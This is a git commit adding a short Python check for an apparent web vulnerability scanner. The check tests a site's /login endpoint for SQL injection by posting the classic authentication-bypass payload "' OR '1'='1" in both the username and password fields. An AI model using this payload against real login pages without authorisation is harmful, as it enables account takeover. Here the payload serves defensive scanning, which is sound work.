cb61697449b6ff600d47a3aed0b4683c46d3da24
Uzair Khan <never.regretonthechoiceyoumade@gmail.com>
2026-02-19 00:03:38 +0500

    Add files via upload

---
+++ sql_injection.py
@@ -0,0 +1,32 @@
+import requests
+from base_check import BaseCheck
+
+class SQLInjectionCheck(BaseCheck):
+    name = "SQL Injection Check"
+
+    def run(self, base_url):
+        payload = {
+            "username": "' OR '1'='1",
+            "password": "' OR '1'='1"
+        }
+
+        try:
+            response = requests.post(f"{base_url}/login", data=payload)
+
+            if "Login Successful" in response.text:
+                return {
+                    "check": self.name,
+                    "status": "VULNERABLE"
+                }
+            else:
+                return {
+                    "check": self.name,
+                    "status": "SAFE"
+                }
+
+        except Exception as e:
+            return {
+                "check": self.name,
+                "status": "ERROR",
+                "detail": str(e)
+            }
